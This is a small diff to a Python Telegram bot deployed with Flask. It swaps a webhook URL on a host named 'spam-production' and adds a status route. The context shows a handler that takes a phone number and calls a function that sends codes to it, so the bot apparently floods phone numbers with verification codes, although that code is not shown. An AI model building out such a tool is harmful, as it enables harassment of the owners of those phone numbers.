@@ -122,7 +122,7 @@ def handle_phone(message):
     bot.delete_message(chat_id, message.message_id)
     send_codes_sync(chat_id, state["message_id"], phone)
 
-WEBHOOK_URL = "https://spam-production-64ec.up.railway.app/webhook"
+WEBHOOK_URL = "https://smap-production-a671.up.railway.app/webhook"
 app = Flask(__name__)
 
 @app.route('/webhook', methods=['POST'])
@@ -133,6 +133,10 @@ def webhook():
         bot.process_new_updates([update])
         return '', 200
     return '', 403
+
+@app.route('/')
+def index():
+    return "Server is running", 200
 
 if __name__ == "__main__":
     bot.remove_webhook()
